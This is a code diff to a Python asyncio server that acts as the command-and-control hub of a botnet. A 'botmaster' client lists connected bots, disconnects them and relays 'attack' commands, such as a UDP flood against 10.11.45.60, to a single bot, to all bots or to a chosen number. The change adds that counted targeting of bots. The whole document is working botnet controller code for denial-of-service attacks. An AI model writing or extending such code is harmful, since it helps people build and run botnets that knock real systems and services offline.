@@ -16,8 +16,8 @@ async def handle_client(reader, writer):
             break
         # register botmaster
         # list
-        # rst bot1 or all
-        # attack bot2/all udp 10.11.45.60 1 20
+        # rst bot1/--all/--xx
+        # attack bot2/--all/--xx udp 10.11.45.60 1 20
         # register bot1
         message = data.decode()
         para = message.split(' ',2)
@@ -45,38 +45,59 @@ async def handle_client(reader, writer):
                 res = None
                 if cmd == 'list':
                     res = ''.join([key + '\n' for key in clients.keys()])
+                    res += f'\ntotal: {len(clients)-1}'
                 else:
                     bot = para[1]
-                    if bot != 'all' and bot not in clients.keys():
+                    bot_cnt = -2
+                    if para[1].find('--') == 0:
+                        bot = para[1][2:]
+                        if bot != 'all':
+                            bot_cnt = int(bot)
+                        else:
+                            bot_cnt = -1
+                    else:
+                        bot = para[1]
+
+                    print(f'bot={bot}, bot_cnt={bot_cnt}')
+                    if bot_cnt == -2 and bot not in clients.keys():
                         res = f'{bot} not found'
                     if cmd == 'rst':
-                        if bot != 'all':
+                        if bot_cnt == -2:
                             bot_writer = clients[bot]
                             bot_writer.close()
                             del clients[bot]
                             res = f'{bot} disconnected'
                         else:
                             to_delete = []
+                            i = 0
                             for b, w in clients.items():
                                 if b != 'botmaster':
                                     w.close()
                                     to_delete.append(b)
+                                    i += 1
+                                    if bot_cnt >= 0 and i >= bot_cnt:
+                                        break
+
                             for k in to_delete:
                                 del clients[k]
-                            res = 'all bots disconnected'
+                            res = f'{i} bots disconnected'
                     elif cmd == 'attack':
                         bot_cmd = 'attack ' + para[2]
-                        if bot != 'all':
+                        if bot_cnt == -2:
                             bot_writer = clients[bot]
                             bot_writer.write(bot_cmd.encode())
                             await bot_writer.drain()
                             res = f'cmd:{bot_cmd} sent to bot:{bot}'
                         else:
+                            i = 0
                             for b, w in clients.items():
                                 if b != 'botmaster':
                                     w.write(bot_cmd.encode())
                                     await w.drain()
-                            res = f'cmd:{bot_cmd} sent to all bots'
+                                    i += 1
+                                    if bot_cnt >= 0 and i >= bot_cnt:
+                                        break
+                            res = f'cmd:{bot_cmd} sent to {i} bots'
                 botmaster_writer.write(res.encode())
                 await botmaster_writer.drain()
 
